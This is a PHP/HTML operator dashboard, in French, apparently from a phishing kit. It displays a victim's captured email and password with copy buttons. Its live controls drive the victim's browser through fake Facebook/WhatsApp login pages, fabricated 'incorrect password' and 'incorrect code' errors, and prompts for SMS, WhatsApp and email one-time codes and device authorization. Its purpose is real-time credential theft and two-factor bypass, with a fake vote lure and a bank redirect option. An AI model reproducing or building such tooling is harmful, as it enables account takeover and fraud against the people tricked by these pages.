<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Récupérer les informations du client
$filename = 'sessions/' . $sessionId . '.json';
$clientData = [];

if (file_exists($filename)) {
    $clientData = json_decode(file_get_contents($filename), true);
}



// Récupérer la page actuelle du client
$currentPage = 'Inconnue';
$trackingFile = 'tracking/' . $sessionId . '.json';

if (file_exists($trackingFile)) {
    $trackingData = json_decode(file_get_contents($trackingFile), true);
    if (isset($trackingData['page'])) {
        $currentPage = $trackingData['page'];
    }
}

// Fonction pour obtenir le nom de la page
function getPageName($page) {
    $pageNames = [
        'index.php' => 'Page d\'accueil',
        'connexion_f.php' => 'Connexion Facebook',
        'loading.php' => 'Chargement',
        'password_incorrect.php' => 'Mot de passe incorrect',
        'technical_error.php' => 'Erreur technique',
        'vote_accepted.php' => 'Vote accepté',
        'vote_approved.php' => 'Vote approuvé',
        'sms_verification.php' => 'Vérification SMS',
        'whatsapp_verification.php' => 'Vérification WhatsApp',
        'email_verification.php' => 'Vérification email',
        'retry.php' => 'Réessayer',
        'authorize_device.php' => 'Autorisation d\'appareil'
    ];
    
    return $pageNames[$page] ?? $page;
}

// Fonction pour obtenir la couleur de la page
function getPageColor($page) {
    $pageColors = [
        'index.php' => '#1877f2',
        'connexion_f.php' => '#1877f2',
        'loading.php' => '#ff9800',
        'password_incorrect.php' => '#f44336',
        'technical_error.php' => '#f44336',
        'vote_accepted.php' => '#4caf50',
        'vote_approved.php' => '#4caf50',
        'sms_verification.php' => '#9c27b0',
        'whatsapp_verification.php' => '#25D366',
        'email_verification.php' => '#2196f3',
        'retry.php' => '#ff9800',
        'authorize_device.php' => '#1877f2'
    ];
    
    return $pageColors[$page] ?? '#757575';
}

// Fonction pour obtenir l'icône de la page
function getPageIcon($page) {
    $pageIcons = [
        'index.php' => 'fas fa-home',
        'connexion_f.php' => 'fab fa-facebook-f',
        'loading.php' => 'fas fa-spinner',
        'password_incorrect.php' => 'fas fa-times-circle',
        'technical_error.php' => 'fas fa-exclamation-triangle',
        'vote_accepted.php' => 'fas fa-check-circle',
        'vote_approved.php' => 'fas fa-check-double',
        'sms_verification.php' => 'fas fa-sms',
        'whatsapp_verification.php' => 'fab fa-whatsapp',
        'email_verification.php' => 'fas fa-envelope',
        'retry.php' => 'fas fa-redo',
        'authorize_device.php' => 'fas fa-shield-alt'
    ];
    
    return $pageIcons[$page] ?? 'fa-question-circle';
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REMOTE</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary-color: #1877f2;
            --secondary-color: #166fe5;
            --success-color: #4caf50;
            --warning-color: #ff9800;
            --danger-color: #f44336;
            --light-color: #f5f5f5;
            --dark-color: #333;
            --border-color: #ddd;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: var(--dark-color);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            width: 100%;
        }
        
        .header {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 15px;
        }
        
        .header h1 {
            color: var(--primary-color);
            font-size: 24px;
            margin-right: auto;
        }
        
        .header .session-info {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 15px;
        }
        
        .header .session-id {
            background-color: var(--light-color);
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            white-space: nowrap;
        }
        
        .header .client-ip {
            background-color: #000;
  padding: 8px 12px;
  border-radius: 4px;
  font-size: 14px;
  font-weight: bold;
  white-space: nowrap;
  color: #fff;
        }
        
        .card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            overflow: hidden;
        }
        
        .card-header {
            padding: 15px 20px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
        }
        
        .card-header h2 {
            font-size: 18px;
            color: var(--dark-color);
        }
        
        .card-body {
            padding: 20px;
        }
        
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            color: white;
        }
        
        .client-info {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        
        .info-group {
            margin-bottom: 15px;
            position: relative;
        }
        
        .info-group label {
            display: block;
            font-size: 13px;
            color: #666;
            margin-bottom: 5px;
        }
        
        .info-group .value {
            font-size: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
            padding-right: 30px; /* Espace pour le bouton de copie */
        }
        
        .copy-button {
            position: absolute;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            background: transparent;
            border: none;
            color: var(--primary-color);
            cursor: pointer;
            font-size: 20px;
            padding: 5px;
            opacity: 0.7;
            transition: opacity 0.2s;
        }
        
        .copy-button:hover {
            opacity: 1;
        }
        
        .action-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .action-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 12px 20px;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .action-btn[data-action="password_incorrect"] {
            background-color: #e91e63;
            color: white;
        }
        
        .action-btn[data-action="password_incorrect"]:hover {
            background-color: #c2185b;
        }
        
        .action-btn[data-action="connexion_f"] {
            background-color: #1877f2;
            color: white;
        }
        
        .action-btn[data-action="connexion_f"]:hover {
            background-color: #166fe5;
        }

        .action-btn[data-action="facebook_error"] {
            background-color:rgb(242, 24, 24);
            color: white;
        }
        
        .action-btn[data-action="facebook_error"]:hover {
            background-color: rgb(242, 24, 24);
        }
        
        .action-btn[data-action="loading"] {
            background-color:rgb(242, 129, 24);
            color: white;
        }
        
        .action-btn[data-action="loading"]:hover {
            background-color: rgb(242, 129, 24);
        }
        
        
        .action-btn[data-action="technical_error"] {
            background-color: var(--danger-color);
            color: white;
        }
        
        .action-btn[data-action="technical_error"]:hover {
            background-color: #d32f2f;
        }
        
        .action-btn[data-action="vote_accepted"] {
            background-color: var(--success-color);
            color: white;
        }
        
        .action-btn[data-action="vote_accepted"]:hover {
            background-color: #388e3c;
        }
        
        .action-btn[data-action="vote_approved"] {
            background-color: #009688;
            color: white;
        }
        
        .action-btn[data-action="vote_approved"]:hover {
            background-color: #00796b;
        }
        
        .action-btn[data-action="redirect"][data-page="sms_verification"],
        .action-btn[data-action="sms_error"] {
            background-color: #9c27b0;
            color: white;
        }
        
        .action-btn[data-action="redirect"][data-page="sms_verification"]:hover,
        .action-btn[data-action="sms_error"]:hover {
            background-color: #7b1fa2;
        }
        
        .action-btn[data-action="redirect"][data-page="whatsapp_verification"],
        .action-btn[data-action="whatsapp_error"] {
            background-color: #25D366;
            color: white;
        }
        
        .action-btn[data-action="redirect"][data-page="whatsapp_verification"]:hover,
        .action-btn[data-action="whatsapp_error"]:hover {
            background-color: #128C7E;
        }
        
        .action-btn[data-action="redirect"][data-page="email_verification"],
        .action-btn[data-action="email_error"] {
            background-color: #2196f3;
            color: white;
        }
        
        .action-btn[data-action="redirect"][data-page="email_verification"]:hover,
        .action-btn[data-action="email_error"]:hover {
            background-color: #1976d2;
        }
        
        .action-btn[data-action="retry"] {
            background-color: var(--warning-color);
            color: white;
        }
        
        .action-btn[data-action="retry"]:hover {
            background-color: #f57c00;
        }
        
        .action-btn[data-action="redirect"][data-page="belfius"] {
            background-color: #f44336;
            color: white;
        }
        
        .action-btn[data-action="redirect"][data-page="belfius"]:hover {
            background-color: #d32f2f;
        }
        
        .action-btn[data-action="redirect"][data-page="authorize_device"] {
            background-color: #1877f2;
            color: white;
        }
        
        .action-btn[data-action="redirect"][data-page="authorize_device"]:hover {
            background-color: #166fe5;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 6px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            color: white;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
            z-index: 1000;
            opacity: 0;
            transform: translateY(-20px);
            transition: all 0.3s;
        }
        
        .notification.success {
            background-color: var(--success-color);
        }
        
        .notification.error {
            background-color: var(--danger-color);
        }
        
        .notification.show {
            opacity: 1;
            transform: translateY(0);
        }
        
        .refresh-button {
            background-color: transparent;
            border: none;
            color: var(--primary-color);
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            white-space: nowrap;
        }
        
        .refresh-button:hover {
            color: var(--secondary-color);
        }
        
        .auto-refresh {
            display: flex;
            align-items: center;
            gap: 10px;
            white-space: nowrap;
        }
        
        .auto-refresh label {
            font-size: 14px;
            color: #666;
        }
        
        .switch {
            position: relative;
            display: inline-block;
            width: 40px;
            height: 20px;
        }
        
        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 20px;
        }
        
        .slider:before {
            position: absolute;
            content: "";
            height: 16px;
            width: 16px;
            left: 2px;
            bottom: 2px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        input:checked + .slider {
            background-color: var(--primary-color);
        }
        
        input:checked + .slider:before {
            transform: translateX(20px);
        }
        
        .copy-tooltip {
            position: absolute;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
            white-space: nowrap;
            z-index: 100;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
        }
        
        .copy-tooltip.show {
            opacity: 1;
        }
        
        /* Styles responsifs */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .header .session-info {
                width: 100%;
                justify-content: space-between;
            }
            
            .card-header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .action-buttons {
                grid-template-columns: 1fr 1fr;
            }
        }
        
        @media (max-width: 480px) {
            .action-buttons {
                grid-template-columns: 1fr;
            }
            
            .header .session-info {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .auto-refresh {
                margin-left: 0;
                margin-top: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
        <div class="client-ip">
                    <i class="fas fa-network-wired"></i> IP: <span id="client-ip"><?php echo htmlspecialchars($clientIp); ?></span>
                   
                </div>
            <div class="session-info">
               
                <button class="refresh-button" onclick="refreshPage()">
                    <i class="fas fa-sync-alt"></i> Actualiser
                </button>
                <div class="auto-refresh">
                    <label for="auto-refresh-toggle">Auto-refresh:</label>
                    <label class="switch">
                        <input type="checkbox" id="auto-refresh-toggle" checked onchange="toggleAutoRefresh()">
                        <span class="slider"></span>
                    </label>
                </div>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Statut du client</h2>
                <div class="status-badge" style="background-color: <?php echo getPageColor($currentPage); ?>">
                    <i class="<?php echo getPageIcon($currentPage); ?>"></i>
                    <span id="pagename" data-id="<?php echo($currentPage); ?>"><?php echo getPageName($currentPage); ?></span>
                </div>
            </div>
            <div class="card-body">
                <div class="client-info">
                    <div class="info-group">
                        <label>Email</label>
                        <div class="value">
                            <i class="fas fa-envelope"></i> 
                            <span id="client-email"><?php echo !empty($clientData['email']) ? htmlspecialchars($clientData['email']) : 'Non disponible'; ?></span>
                            <button class="copy-button" onclick="copyToClipboard('client-email', 'Email')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <div class="info-group">
                        <label>Mot de passe</label>
                        <div class="value">
                            <i class="fas fa-key"></i> 
                            <span id="client-password"><?php echo !empty($clientData['password']) ? htmlspecialchars($clientData['password']) : 'Non disponible'; ?></span>
                            <button class="copy-button" onclick="copyToClipboard('client-password', 'Mot de passe')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <!-- <div class="info-group">
                        <label>User Agent</label>
                        <div class="value">
                            <i class="fas fa-desktop"></i> 
                            <span id="client-ua"><?php echo !empty($clientData['user_agent']) ? htmlspecialchars($clientData['user_agent']) : 'Non disponible'; ?></span>
                            <button class="copy-button" onclick="copyToClipboard('client-ua', 'User Agent')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div> -->
                    <!-- <div class="info-group">
                        <label>Date de connexion</label>
                        <div class="value">
                            <i class="fas fa-clock"></i> 
                            <span id="client-time"><?php echo !empty($clientData['timestamp']) ? date('d/m/Y H:i:s', $clientData['timestamp']) : 'Non disponible'; ?></span>
                            <button class="copy-button" onclick="copyToClipboard('client-time', 'Date')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div> -->
                </div>
                
                <div class="action-buttons">
                    <button class="action-btn" data-action="connexion_f">
                    <i class="fab fa-facebook-f"></i> whatsapp login
                    </button>
                    <button class="action-btn" data-action="facebook_error">
                    <i class="fab fa-facebook-f"></i> whatsapp incorrect
                    </button>
                    <button class="action-btn" style="display:none" data-action="password_incorrect">
                        <i class="fas fa-times-circle"></i> Mot de passe incorrect
                    </button>
                    <button class="action-btn" data-action="technical_error">
                        <i class="fas fa-exclamation-triangle"></i> Erreur technique
                    </button>
                    <button class="action-btn" style="display:none" data-action="vote_accepted">
                        <i class="fas fa-check-circle"></i> Accepter vote
                    </button>
                    <button class="action-btn" data-action="vote_approved">
                        <i class="fas fa-check-double"></i> Approuver vote
                    </button>
                    <button class="action-btn" data-action="redirect" data-page="sms_verification">
                        <i class="fas fa-sms"></i> Demander PIN
                    </button>
                    <button class="action-btn" data-action="sms_error">
                        <i class="fas fa-exclamation-circle"></i> PIN incorrect
                    </button>
                    <button class="action-btn" data-action="redirect" data-page="whatsapp_verification">
                        <i class="fab fa-whatsapp"></i> Demander WhatsApp
                    </button>
                    <button class="action-btn" data-action="whatsapp_error">
                        <i class="fas fa-exclamation-circle"></i> WhatsApp incorrect
                    </button>
                    <button class="action-btn" data-action="redirect" data-page="email_verification">
                        <i class="fas fa-envelope"></i> Demander Email
                    </button>
                    <button class="action-btn" data-action="email_error">
                        <i class="fas fa-exclamation-circle"></i> Code incorrect
                    </button>
                    <button class="action-btn" data-action="redirect" data-page="authorize_device">
                        <i class="fas fa-shield-alt"></i> Autorisation appareil
                    </button>
                    <button class="action-btn" data-action="loading">
                        <i class="fas fa-spinner"></i> loading
                    </button>
                    <button class="action-btn" data-action="retry">
                        <i class="fas fa-redo"></i> Réessayer
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <div class="notification" id="notification"></div>
    <div class="copy-tooltip" id="copy-tooltip"></div>
    
    <script>
        // Variables globales
        const sessionId = '<?php echo $sessionId; ?>';
        const clientIp = '<?php echo $clientIp; ?>';
        let autoRefreshInterval = null;
        
        // Fonction pour actualiser la page
        function refreshPage() {
            window.location.reload();
        }
        
        // Fonction pour activer/désactiver l'actualisation automatique
        function toggleAutoRefresh() {
            const autoRefreshToggle = document.getElementById('auto-refresh-toggle');
            
            if (autoRefreshToggle.checked) {
                // Activer l'actualisation automatique (toutes les 2 secondes)
                autoRefreshInterval = setInterval(() => {
                    // Actualiser uniquement les données du client sans recharger la page
                    fetchClientStatus();
                }, 2000);
                
                showNotification('Actualisation automatique activée', 'success');
            } else {
                // Désactiver l'actualisation automatique
                if (autoRefreshInterval) {
                    clearInterval(autoRefreshInterval);
                    autoRefreshInterval = null;
                }
                
                showNotification('Actualisation automatique désactivée', 'success');
            }
        }
        
        // Fonction pour récupérer le statut du client
        function fetchClientStatus() {
            fetch(`get_client_status.php?session=${sessionId}&ip=${clientIp}`)
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Mettre à jour le badge de statut
                    const statusBadge = document.querySelector('.status-badge');
                    statusBadge.style.backgroundColor = data.pageColor;
                    statusBadge.innerHTML = `<i class="${data.pageIcon}"></i> <span id="pagename" data-id="${data.page}">${data.pageName}</span>`;
                }
            })
            .catch(error => {
                console.error('Erreur lors de la récupération du statut:', error);
            });
        }
        // Ajouter des gestionnaires d'événements pour les boutons d'action
document.querySelectorAll('.action-btn').forEach(button => {
    button.addEventListener('click', function() {
        const action = this.getAttribute('data-action');
        
        // Vérifier si l'action est appropriée pour la page actuelle
        const currentPage = document.getElementById('pagename').getAttribute('data-id');
        console.log(currentPage);
 
            
            if (action === 'facebook_error' && currentPage !== 'connexion_f.php' && currentPage !== 'loading.php') {
            showNotification('Cette action ne peut être envoyée que lorsque le client est sur la page de connexion Facebook.', 'error');
            return;
        }
        
        if (action === 'sms_error' && currentPage !== 'sms_verification.php' && currentPage !== 'loading.php') {
            showNotification('Cette action ne peut être envoyée que lorsque le client est sur la page de vérification SMS.', 'error');
            return;
        }
        
        if (action === 'whatsapp_error' && currentPage !== 'whatsapp_verification.php' && currentPage !== 'loading.php') {
            showNotification('Cette action ne peut être envoyée que lorsque le client est sur la page de vérification WhatsApp.', 'error');
            return;
        }
        
        if (action === 'email_error' && currentPage !== 'email_verification.php' && currentPage !== 'loading.php') {
            showNotification('Cette action ne peut être envoyée que lorsque le client est sur la page de vérification Email.', 'error');
            return;
        }
        
        if (action === 'redirect' && this.getAttribute('data-page') === 'authorize_device' && currentPage !== 'loading.php') {
            showNotification('L\'autorisation d\'appareil ne peut être demandée que lorsque le client est sur la page de chargement.', 'error');
            return;
        }
        const requestData = {
            session: sessionId,
            ip: clientIp,
            action: action
        };
        
        // Ajouter des données supplémentaires en fonction de l'action
        if (action === 'redirect') {
            const page = this.getAttribute('data-page');
            requestData.redirect = page;
        } else if (action === 'sms_error') {
            requestData.errorMessage = 'Le code SMS que vous avez entré est incorrect. Veuillez réessayer.';
        } else if (action === 'password_incorrect') {
            requestData.errorMessage = 'Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.';
        } else if (action === 'facebook_error') {
            requestData.errorMessage = 'Les informations que vous avez saisies sont incorrectes. Veuillez réessayer.';
        } else if (action === 'whatsapp_error') {
            requestData.errorMessage = 'Le code WhatsApp que vous avez entré est incorrect. Veuillez réessayer.';
        } else if (action === 'email_error') {
            requestData.errorMessage = 'Le code Email que vous avez entré est incorrect. Veuillez réessayer.';
        }
        
        // Envoyer la requête
        fetch('save_action.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestData)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let successMessage = '';
                
                if (action === 'redirect') {
                    const page = this.getAttribute('data-page');
                    successMessage = `Redirection vers ${page} envoyée avec succès`;
                } else if (action.includes('error')) {
                    successMessage = `Erreur ${action.replace('_error', '')} envoyée avec succès`;
                } else {
                    successMessage = `Action "${action}" envoyée avec succès`;
                }
                
                showNotification(successMessage, 'success');
                
                // Mettre à jour le statut du bouton
                const originalText = this.innerHTML;
                this.innerHTML = '<i class="fas fa-check"></i> Envoyé';
                this.disabled = true;
                
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.disabled = false;
                }, 3000);
            } else {
                showNotification(`Erreur: ${data.error}`, 'error');
            }
        })
        .catch(error => {
            console.error('Erreur:', error);
            showNotification('Erreur lors de l\'envoi de l\'action', 'error');
        });

   
        // Vérifier les conditions pour bloquer certaines actions
  
        // Préparer les données de base
      
    });
});
        
        // Fonction pour copier du texte dans le presse-papiers
        function copyToClipboard(elementId, label) {
            const element = document.getElementById(elementId);
            const text = element.textContent;
            
            if (text === 'Non disponible') {
                showNotification('Aucune donnée à copier.', 'error');
                return;
            }
            
            navigator.clipboard.writeText(text)
                .then(() => {
                    // Afficher l'infobulle
                    const copyButton = element.nextElementSibling;
                    const tooltip = document.getElementById('copy-tooltip');
                    
                    tooltip.textContent = `${label} copié !`;
                    tooltip.classList.add('show');
                    
                    // Positionner l'infobulle
                    const buttonRect = copyButton.getBoundingClientRect();
                    tooltip.style.top = (buttonRect.top - 30) + 'px';
                    tooltip.style.left = (buttonRect.left - 40) + 'px';
                    
                    // Masquer l'infobulle après 2 secondes
                    setTimeout(() => {
                        tooltip.classList.remove('show');
                    }, 2000);
                })
                .catch(err => {
                    console.error('Erreur lors de la copie:', err);
                    showNotification('Erreur lors de la copie.', 'error');
                });
        }
        
        // Fonction pour afficher une notification
        function showNotification(message, type) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.classList.add('show');
            
            // Masquer la notification après 3 secondes
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        // Initialiser l'actualisation automatique au chargement de la page
        document.addEventListener('DOMContentLoaded', function() {
            toggleAutoRefresh();
        });
    </script>
</body>
</html>